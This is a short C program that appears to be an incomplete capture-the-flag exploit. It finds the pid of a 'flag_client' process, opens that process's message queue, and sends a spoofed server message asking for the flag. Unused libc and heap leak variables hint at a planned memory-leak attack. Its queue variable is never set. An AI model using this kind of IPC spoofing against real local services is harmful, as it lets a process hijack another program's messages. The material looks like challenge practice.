#include <sys/msg.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define MAIN_QUEUE_KEY 1337
#define MSGTYPE_TOSERVER 1
#define MSGTYPE_TOCLIENT 2

#define SUBTYPE_SUBMIT_NOTE 3
#define SUBTYPE_GET_COUNT 2
#define SUBTYPE_PING 4
#define SUBTYPE_FLAG 5

#define SUBTYPE_REPLY_FAIL 1
#define SUBTYPE_REPLY_SUCCESS 0

#define MAX_USERMSG_BODY_SIZE 0x100
#define MAX_ALLOWED_NOTES 1000

#define SERVER_UID 1000

typedef struct favorites_s {
    struct favorites_s *next;
    char *str;
} favorite;

typedef struct main_queue_msg_s {
    long mtype;
    unsigned long sess_id;
    key_t queue_id;
} main_queue_msg;

typedef struct  {
    long mtype;
    unsigned char msubtype;
    unsigned long body_len;
    char body[];
} user_queue_msg;

int process_user_queue_msg(key_t msgq, user_queue_msg *msg);
unsigned long get_leaked_bytes(user_queue_msg *msg);

favorite *cool_notes;
unsigned long cool_notes_count;
int dummy_queues[10];
int main_queue;
int our_queue;

int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    
    // Get pid for process
    char line[0x50];
    FILE * command = popen("pidof flag_client","r");

    fgets(line,0x50,command);

    pid_t pid = strtoul(line,NULL,10);
    pclose(command);

    // Open message queue
    int msg_queue = msgget(pid, 0);
    if (msg_queue == -1) {
        printf("msgget failed\n");
        return -1;
    }

    user_queue_msg ping = { MSGTYPE_TOCLIENT, SUBTYPE_FLAG, 0 };
    msgsnd(msg_queue, &ping, sizeof(user_queue_msg), 0);

    // This loop services our message queue
    while (1) {
        char buf[0x100];
        ssize_t num_bytes = msgrcv(msg_queue, buf, sizeof(buf), MSGTYPE_TOSERVER, MSG_NOERROR);
        if (num_bytes > 0) {
            process_user_queue_msg(our_queue, (user_queue_msg*)buf);
        }
    }
}


unsigned long libc_leak;
unsigned long heap_leak;
int process_user_queue_msg(key_t msgq, user_queue_msg *msg) {
    printf("%s\n", msg->body);
    if (msg->msubtype == SUBTYPE_REPLY_SUCCESS) {
	    printf("[+] Success\n");
    } else if (msg->msubtype == SUBTYPE_REPLY_FAIL) {
	printf("[x] Reply: Failed\n");
    }
    
    return -1;
}

